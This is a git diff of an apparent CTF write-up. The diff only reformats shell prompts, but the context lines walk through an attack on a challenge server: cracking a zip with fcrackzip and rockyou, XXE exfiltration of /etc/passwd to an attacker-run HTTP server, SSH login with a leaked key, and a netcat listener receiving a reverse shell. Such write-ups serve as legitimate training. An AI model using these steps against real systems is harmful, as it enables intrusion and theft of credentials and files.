@@ -251,11 +251,11 @@ I will not explain here how Sqlmap work, but you can easily understand the comma
 So you can now access to the storage. There is an amount of useless files. The archive `CONFIDENTIEL.zip` is a trap. Be focus on the encrypted archive `recup.zip`.
 
 ```
-th1b4ud@th1b4ud-pc $ unzip recup.zip 
+[th1b4ud@th1b4ud-pc ~]$ unzip recup.zip 
 Archive:  recup.zip
 [recup.zip] password.txt password: 
 
-th1b4ud@th1b4ud-pc $ unzip -l recup.zip 
+[th1b4ud@th1b4ud-pc ~]$ unzip -l recup.zip 
 Archive:  recup.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
@@ -267,7 +267,7 @@ Archive:  recup.zip
 Maybe the archive password is weak ? Try to break it with bruteforce attack with fcrackzip. Don't forget -u !
 
 ```
-th1b4ud@th1b4ud-pc $ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
+[th1b4ud@th1b4ud-pc ~]$ fcrackzip -v -u -D -p /home/th1b4ud/dictionaries/rockyou.txt recup.zip 
 found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)
 
 PASSWORD FOUND!!!!: pw == hackerman
@@ -336,7 +336,7 @@ Lets try to decipher the disk `media` and `documents`
 - Password `0twain-Mao0-flash-6Goof-Gent` decrypt disk `documents`
 
 ```
-th1b4ud@th1b4ud-pc $ tree /mnt
+[th1b4ud@th1b4ud-pc ~]$ tree /mnt
 |-- veracrypt1
 |   |-- $RECYCLE.BIN
 |   |   `-- desktop.ini
@@ -380,7 +380,7 @@ Of course ! Why not to try to decipher a disk with a password AND a file ! This 
 
 
 ```
-th1b4ud@th1b4ud-pc $ tree /mnt
+[th1b4ud@th1b4ud-pc ~]$ tree /mnt
 /mnt
 |-- veracrypt1
     |-- $RECYCLE.BIN
@@ -399,7 +399,7 @@ th1b4ud@th1b4ud-pc $ tree /mnt
 OHOHOOHHO FU**** GODDD ! IT WORKS !!!
 
 ```
-th1b4ud@th1b4ud-pc $ cat /mnt/veracrypt1/flag.txt
+[th1b4ud@th1b4ud-pc ~]$ cat /mnt/veracrypt1/flag.txt
 IMTLD{I_h4v3_N0th1ng_T0_h1d3}
 ```
 
@@ -497,7 +497,7 @@ When I heard the word XML, I think immediately to XXE vulnerability. Indeed, thi
 On your server (here `12.34.56.78`) you just have to launch a listener (netcat, python, apache2, like you want...). I will choose python because it will be helpull later.
 
 ```
-th1b4ud@th1b4ud-pc $ python -m SimpleHTTPServer 4444
+[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
 51.75.202.113 - - [27/Dec/2018 23:18:20] "GET / HTTP/1.0" 200 -
 ```
@@ -546,7 +546,7 @@ Here we have our malicious code : `exploit.dtd`. It will compress, base64 encode
 And on the attacker’s server we receive the extracted data
 
 ```
-th1b4ud@th1b4ud-pc $ python -m SimpleHTTPServer 4444
+[th1b4ud@th1b4ud-pc ~]$ python -m SimpleHTTPServer 4444
 Serving HTTP on 0.0.0.0 port 4444 ...
 
 # This is the first GET request to obtain the malicious file
@@ -559,7 +559,7 @@ Serving HTTP on 0.0.0.0 port 4444 ...
 So now, I think you are pro base64 decoder :p
 
 ```
-th1b4ud@th1b4ud-pc $ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==" | base64 -d
+[th1b4ud@th1b4ud-pc ~]$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCg==" | base64 -d
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -714,7 +714,7 @@ LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
 HOHOH. READABLE ! What a huge mistake ! We can now connect to the server with user `dark_lottery`.
 
 ```bash 
-th1b4ud@th1b4ud-pc $ ssh dark_lottery@51.75.202.113 -p 2020 -i key
+[th1b4ud@th1b4ud-pc ~]$ ssh dark_lottery@51.75.202.113 -p 2020 -i key
 
     ___           _        __       _   _
    /   \__ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
@@ -964,7 +964,7 @@ chmod +x shell.sh
 And set your listener on your attacker's server
 
 ```
-th1b4ud@th1b4ud-pc $ nc -lvp 4444
+[th1b4ud@th1b4ud-pc ~]$ nc -lvp 4444
 listening on [any] 4444 ...
 connect to [192.168.0.50] from 113.ip-51-75-202.eu [51.75.202.113] 34982
 bash: cannot set terminal process group (25128): Inappropriate ioctl for device
